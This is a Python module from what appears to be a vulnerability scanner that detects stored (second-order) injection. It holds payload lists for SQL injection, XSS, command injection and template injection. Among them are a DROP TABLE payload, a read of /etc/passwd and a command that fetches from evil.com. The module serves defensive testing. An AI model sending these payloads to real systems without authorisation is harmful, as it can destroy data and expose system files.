"""Second-order vulnerability detection — stored/persisted injection analysis."""

from __future__ import annotations

import hashlib
import re
from dataclasses import dataclass, field
from typing import Any

from basilisk.models import Finding
from basilisk.scoring import score_finding

SECOND_ORDER_PAYLOADS = {
    "sqli": [
        "' OR '1'='1",
        "1' AND 1=1--",
        "'; DROP TABLE users--",
        "' UNION SELECT NULL,NULL--",
        "1' OR '1'='1' /*",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
    ],
    "cmdi": [
        ";id",
        "|whoami",
        "`cat /etc/passwd`",
        "$(curl evil.com)",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "{{config}}",
    ],
}

STORAGE_INJECTION_POINTS = [
    {"field": "username", "vulns": ["sqli", "xss", "ssti"]},
    {"field": "email", "vulns": ["sqli", "xss"]},
    {"field": "bio", "vulns": ["xss", "ssti"]},
    {"field": "comment", "vulns": ["xss", "sqli", "ssti"]},
    {"field": "address", "vulns": ["xss", "sqli"]},
    {"field": "name", "vulns": ["xss", "ssti"]},
    {"field": "full_name", "vulns": ["xss"]},
    {"field": "display_name", "vulns": ["xss", "ssti"]},
]

STORAGE_ENDPOINTS = [
    {"path": "/api/users", "method": "POST", "field": "username"},
    {"path": "/api/profile", "method": "PUT", "field": "bio"},
    {"path": "/api/comments", "method": "POST", "field": "comment"},
    {"path": "/api/settings", "method": "PUT", "field": "display_name"},
]


@dataclass
class SecondOrderChain:
    inject_url: str = ""
    inject_field: str = ""
    inject_payload: str = ""
    vuln_type: str = ""
    trigger_url: str = ""
    trigger_response_snippet: str = ""
    confirmed: bool = False


class SecondOrderDetector:
    """Detect second-order (stored) injection by tracking payloads through the app."""

    def __init__(self, submit_fn=None, fetch_fn=None):
        self.submit_fn = submit_fn
        self.fetch_fn = fetch_fn
        self._injected: dict[str, list[SecondOrderChain]] = {}

    def inject_payloads(
        self,
        base_url: str,
        endpoints: list[dict] | None = None,
    ) -> list[SecondOrderChain]:
        chains: list[SecondOrderChain] = []
        endpoints = endpoints or STORAGE_ENDPOINTS

        for ep in endpoints:
            url = f"{base_url.rstrip('/')}{ep['path']}"
            field = ep["field"]
            inject_point = next(
                (p for p in STORAGE_INJECTION_POINTS if p["field"] == field),
                {"field": field, "vulns": ["xss", "sqli"]},
            )

            for vuln_type in inject_point["vulns"]:
                payloads = SECOND_ORDER_PAYLOADS.get(vuln_type, [])
                for payload in payloads[:3]:
                    chain = SecondOrderChain(
                        inject_url=url,
                        inject_field=field,
                        inject_payload=payload,
                        vuln_type=vuln_type,
                    )
                    chains.append(chain)
                    key = hashlib.md5(payload.encode()).hexdigest()[:12]
                    self._injected.setdefault(key, []).append(chain)

        return chains

    def check_stored(
        self,
        response_body: str,
        source_url: str = "",
    ) -> list[Finding]:
        findings: list[Finding] = []
        lower_body = response_body.lower() if response_body else ""

        for key, chains in self._injected.items():
            for chain in chains:
                if chain.inject_payload[:20] in response_body:
                    chain.confirmed = True
                    chain.trigger_url = source_url
                    chain.trigger_response_snippet = response_body[:100]
                    cvss, vector = score_finding(chain.vuln_type)
                    findings.append(
                        Finding(
                            vulnerability=f"Second-Order {chain.vuln_type.upper()} Injection",
                            severity="Critical",
                            description=(
                                f"Payload '{chain.inject_payload[:40]}' injected into "
                                f"'{chain.inject_field}' at {chain.inject_url} was found "
                                f"unmodified in response from {source_url}. Stored injection confirmed."
                            ),
                            target=source_url,
                            attack_type=chain.vuln_type,
                            payload=chain.inject_payload,
                            cvss_score=cvss,
                            cvss_vector=vector,
                            remediation="Apply output encoding when rendering stored data. "
                                        "Use parameterized queries for all database operations.",
                        )
                    )

        error_sigs = [
            "sql syntax", "mysql_fetch", "sqlite3.operationalerror",
            "unclosed quotation", "odbc driver",
        ]
        for sig in error_sigs:
            if sig in lower_body:
                for key, chains in self._injected.items():
                    for chain in chains:
                        if chain.inject_payload in response_body:
                            cvss, vector = score_finding("sqli")
                            findings.append(
                                Finding(
                                    vulnerability="Second-Order SQL Injection (Error)",
                                    severity="Critical",
                                    description=(
                                        f"SQL error '{sig}' triggered by stored payload "
                                        f"'{chain.inject_payload[:40]}' from field '{chain.inject_field}'."
                                    ),
                                    target=source_url,
                                    attack_type="sqli",
                                    payload=chain.inject_payload,
                                    cvss_score=cvss,
                                    cvss_vector=vector,
                                )
                            )

        return findings

    def _scan_for_reflection(
        self,
        body: str,
        payloads: list[str],
        source: str,
    ) -> list[Finding]:
        findings: list[Finding] = []
        for payload in payloads:
            if payload[:20] in body:
                cvss, vector = score_finding("xss")
                findings.append(
                    Finding(
                        vulnerability="Second-Order XSS (Stored Reflection)",
                        severity="High",
                        description=f"Payload '{payload[:40]}' reflected in response. Stored XSS confirmed.",
                        target=source,
                        attack_type="xss",
                        payload=payload,
                        cvss_score=cvss,
                        cvss_vector=vector,
                    )
                )
        return findings


def get_storage_endpoints() -> list[dict]:
    return list(STORAGE_ENDPOINTS)

def get_second_order_payloads() -> dict[str, list[str]]:
    return dict(SECOND_ORDER_PAYLOADS)
